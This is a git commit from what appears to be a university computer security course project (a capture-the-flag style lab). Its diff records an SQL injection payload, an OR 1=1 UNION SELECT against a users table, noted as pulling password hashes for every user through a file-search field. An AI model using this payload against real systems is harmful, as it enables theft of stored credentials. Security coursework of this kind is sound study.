ea850d7bd5bcb6c4fd9088b61c19387d79cae0ca
Saransh Rakshak <srakshak@berkeley.edu>
2021-12-11 12:06:51 -0800

    shitty attempt of flag7

--- cs161proj3/f3_shomil.js
+++ cs161proj3/f3_shomil.js
@@ -1,2 +1,2 @@
-//Insert in List Files> Search for a file using login dev
-//shomil' OR 1=1 UNION SELECT md5_hash FROM users' --//gets password hashes for all users
+//Insert SQLi in List Files --> Search for a file using login dev
+shomil'OR 1=1 UNION SELECT md5_hash FROM users' --//gets password hashes for all users
